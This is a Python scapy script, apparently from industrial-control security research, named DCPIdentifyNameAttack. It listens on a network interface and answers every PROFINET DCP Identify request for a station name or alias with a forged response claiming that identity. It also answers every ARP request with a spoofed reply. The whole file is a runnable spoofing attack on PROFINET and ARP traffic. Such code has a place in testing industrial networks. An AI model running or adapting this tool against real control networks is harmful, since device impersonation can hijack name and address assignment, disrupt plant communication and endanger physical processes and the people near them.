#!/usr/bin/env python3

from scapy.all import *
from pnio import ProfinetIO
from pnio_dcp import *
from configmgr import ConfigMgr

DEBUG = False

ETHER_TYPE_ARP = 0x806
ETHER_TYPE_PNIO = 0x8892

REQUEST = 0
RESPONSE = 1

DCP_OPTION_DEVICE_PROPERTIES = 2
DCP_SUBOPTION_NAME_OF_STATION = 2
DCP_SUBOPTION_ALIAS_NAME = 6
DCP_SUBOPTION_IP = 7


class DCPIdentifyNameAttack():

    def __init__(self):
        self.SNIFF_FILTER_PNIO_MULTICAST = "(ether dst 01:0e:cf:00:00:00) or arp" # ARP or PN IO Multicast

        cm = ConfigMgr()

        self.IFACE = cm.getValue("Attacker", "iface", "enp0s25")
        self.s = conf.L2socket(iface=self.IFACE)
        pass


    def handle_arp_request(self, pkt):
        if DEBUG:
            pkt.show2()
        ############################
        ### IP ASSIGNMENT -> ARP ###
        ############################
        # only handle requests
        try:
            if (pkt[ARP].op == 1): # who-has
                print("ARP Request")
                arp_reply = Ether(dst=pkt.src) / ARP(op="is-at", hwsrc=pkt.hwdst, psrc=pkt.pdst, hwdst=pkt.hwsrc, pdst=pkt.psrc)
                if DEBUG:
                    arp_reply.show2()
                return arp_reply
        except:
            print("ERROR: reply to ARP request was not successful")
            return None


    def handle_dcp_request(self, pkt):
        if DEBUG:
            print("DCP")
        # only check DCP Identify Requests
        if (pkt[ProfinetIO].frameID != DCP_IDENTIFY_REQUEST_FRAME_ID):
            return None
        if DEBUG:
            pkt.show2()

        dst_mac = pkt.src
        xid = pkt[ProfinetDCP].xid

        #######################
        ### NAME OF STATION ###
        #######################
        try:
            if pkt[ProfinetDCP].option == DCP_OPTION_DEVICE_PROPERTIES and pkt[
                ProfinetDCP].sub_option == DCP_SUBOPTION_NAME_OF_STATION:
                name = pkt[ProfinetDCP].name_of_station
                print("DCP Identify Request - Name of Station: ", name)
                dcp_response = Ether(dst=dst_mac) / ProfinetIO(frameID=DCP_IDENTIFY_RESPONSE_FRAME_ID) / ProfinetDCP(
                    service_id=5, service_type=RESPONSE, xid=xid) / DCPNameOfStationBlock(name_of_station=name)
                if DEBUG:
                    dcp_response.show2()

                return dcp_response
        except:
            print("ERROR: reply to name of station request was not successful")
            return None

        ##################
        ### ALIAS NAME ###
        ##################
        # TODO Alias Name response needs a futzher manufacturer specific block
        try:
            if pkt[ProfinetDCP].option == DCP_OPTION_DEVICE_PROPERTIES and pkt[
                ProfinetDCP].sub_option == DCP_SUBOPTION_ALIAS_NAME:
                alias = pkt[ProfinetDCP].alias_name
                if DEBUG:
                    print("DCP Identify Request - Alias: ", alias)
                dcp_response = Ether(dst=dst_mac) / ProfinetIO(frameID=DCP_IDENTIFY_RESPONSE_FRAME_ID) / ProfinetDCP(
                    service_id=5, service_type=RESPONSE, xid=xid) / DCPAliasNameBlock(alias_name=alias)
                if DEBUG:
                    dcp_response.show2()
                return dcp_response
        except:
            print("ERROR: reply to alias name request was not successful")
            return None


    def send_response(self, pkt):
        packet = None
        try:
            if (pkt.type == ETHER_TYPE_ARP):
                packet = self.handle_arp_request(pkt)
        except:
            print("ERROR: sending ARP failed")

        try:
            if (pkt.type == ETHER_TYPE_PNIO):
                packet = self.handle_dcp_request(pkt)
        except:
            print("ERROR: sending DCP response failed")

        if packet:
            self.s.send(packet)

    def sniff_requests(self):
        sniff(iface=self.IFACE, prn=self.send_response, filter=self.SNIFF_FILTER_PNIO_MULTICAST)
###################

if __name__ == '__main__':
    d = DCPIdentifyNameAttack()
    d.sniff_requests()
